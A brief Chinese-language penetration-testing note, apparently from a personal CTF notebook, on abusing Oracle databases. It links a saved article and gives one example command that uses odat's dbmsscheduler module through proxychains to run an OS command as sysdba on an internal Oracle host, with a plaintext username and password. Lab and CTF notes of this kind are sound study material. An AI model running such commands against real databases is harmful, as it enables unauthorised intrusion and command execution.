## 文章

[渗透过程中Oracle数据库的利用 _ Loong716](F:\LocalCTF\渗透过程中Oracle数据库的利用 _ Loong716.html)

## 工具

odat（kali中使用）

使用例子

```bash
proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec 'whoami'
```

